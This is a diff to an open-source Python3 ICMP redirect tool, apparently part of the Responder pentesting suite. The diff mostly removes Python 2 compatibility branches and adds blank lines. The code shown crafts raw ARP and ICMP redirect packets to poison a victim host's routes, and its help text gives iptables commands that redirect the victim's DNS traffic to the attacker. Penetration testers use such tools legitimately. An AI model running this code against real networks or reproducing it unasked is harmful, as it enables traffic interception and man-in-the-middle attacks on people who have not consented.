@@ -14,6 +14,7 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
 import socket
 import struct
 import optparse
@@ -27,8 +28,10 @@ from random import randrange
 from time import sleep
 from subprocess import call
 
+
 if (sys.version_info < (3, 0)):
    sys.exit('This script is meant to be run with Python3')
+
 parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1',
                                prog=sys.argv[0],
                                )
@@ -74,37 +77,25 @@ ToThisHost = options.ToThisHost
 ToThisHost2 = options.ToThisHost2
 Interface = options.Interface
 
+
 def Show_Help(ExtraHelpData):
     print("\nICMP Redirect Utility 0.1.\nCreated by Laurent Gaffie, please send bugs/comments to laurent.gaffie@gmail.com\n\nThis utility combined with Responder is useful when you're sitting on a Windows based network.\nMost Linux distributions discard by default ICMP Redirects.\n")
     print(ExtraHelpData)
 
 MoreHelp = "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"%(ToThisHost,OURIP)
 
-#Python version
-if (sys.version_info > (3, 0)):
-    PY2OR3     = "PY3"
-else:
-    PY2OR3  = "PY2"
 
 def StructWithLenPython2or3(endian,data):
-    #Python2...
-    if PY2OR3 == "PY2":
-        return struct.pack(endian, data)
-    #Python3...
-    else:
-        return struct.pack(endian, data).decode('latin-1')
+    return struct.pack(endian, data).decode('latin-1')
+
 
 def NetworkSendBufferPython2or3(data):
-    if PY2OR3 == "PY2":
-        return str(data)
-    else:
-        return bytes(str(data), 'latin-1')
+    return bytes(str(data), 'latin-1')
+
 
 def NetworkRecvBufferPython2or3(data):
-    if PY2OR3 == "PY2":
-        return str(data)
-    else:
-        return str(data.decode('latin-1'))
+    return str(data.decode('latin-1'))
+
 
 def GenCheckSum(data):
     s = 0
@@ -113,6 +104,7 @@ def GenCheckSum(data):
         f = s + q
         s = (f & 0xffff) + (f >> 16)
     return StructWithLenPython2or3("<H",~s & 0xffff)
+
 
 class Packet():
 	fields = OrderedDict([
@@ -128,6 +120,7 @@ class Packet():
 	def __str__(self):
 		return "".join(map(str, self.fields.values()))
 
+
 #####################################################################
 #ARP Packets
 #####################################################################
@@ -137,6 +130,7 @@ class EthARP(Packet):
         ("SrcMac", ""),
         ("Type", "\x08\x06" ), #ARP
     ])
+
 
 class ARPWhoHas(Packet):
     fields = OrderedDict([
@@ -155,6 +149,7 @@ class ARPWhoHas(Packet):
         self.fields["DstIP"] = inet_aton(self.fields["DstIP"]).decode('latin-1')
         self.fields["SenderIP"] = inet_aton(OURIP).decode('latin-1')
 
+
 #####################################################################
 #ICMP Redirect Packets
 #####################################################################
@@ -164,6 +159,7 @@ class Eth2(Packet):
         ("SrcMac", ""),
         ("Type", "\x08\x00" ), #IP
     ])
+
 
 class IPPacket(Packet):
     fields = OrderedDict([
@@ -192,6 +188,7 @@ class IPPacket(Packet):
         CheckSumCalc =str(self.fields["VLen"])+str(self.fields["DifField"])+str(self.fields["Len"])+str(self.fields["TID"])+str(self.fields["Flag"])+str(self.fields["FragOffset"])+str(self.fields["TTL"])+str(self.fields["Cmd"])+str(self.fields["CheckSum"])+str(self.fields["SrcIP"])+str(self.fields["DestIP"])
         self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)
 
+
 class ICMPRedir(Packet):
     fields = OrderedDict([
         ("Type",       "\x05"),
@@ -206,6 +203,7 @@ class ICMPRedir(Packet):
         CheckSumCalc =str(self.fields["Type"])+str(self.fields["OpCode"])+str(self.fields["CheckSum"])+str(self.fields["GwAddr"])+str(self.fields["Data"])
         self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)
 
+
 class DummyUDP(Packet):
     fields = OrderedDict([
         ("SrcPort",    "\x00\x35"), #port 53
@@ -213,6 +211,7 @@ class DummyUDP(Packet):
         ("Len",        "\x00\x08"), #Always 8 in this case.
         ("CheckSum",   "\x00\x00"), #CheckSum disabled.
     ])
+
 
 def ReceiveArpFrame(DstAddr):
     s = socket(AF_PACKET, SOCK_RAW)
@@ -235,6 +234,7 @@ def ReceiveArpFrame(DstAddr):
         print("[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr))
         exit(1)
 
+
 def IcmpRedirectSock(DestinationIP):
     PrintMac,DestMac = ReceiveArpFrame(VictimIP)
     print('[ARP]Target Mac address is :',PrintMac)
@@ -254,6 +254,7 @@ def IcmpRedirectSock(DestinationIP):
     s.send(NetworkSendBufferPython2or3(final))
     print('\n[ICMP]%s should have been poisoned with a new route for target: %s.\n'%(VictimIP,DestinationIP))
 
+
 def FindWhatToDo(ToThisHost2):
     if ToThisHost2 != None:
         Show_Help('Hit CTRL-C to kill this script')
@@ -262,6 +263,7 @@ def FindWhatToDo(ToThisHost2):
         Show_Help(MoreHelp)
         IcmpRedirectSock(DestinationIP=ToThisHost)
         exit()
+
 
 def RunThisInLoop(host, host2, ip):
     dns1 = pipes.quote(host)
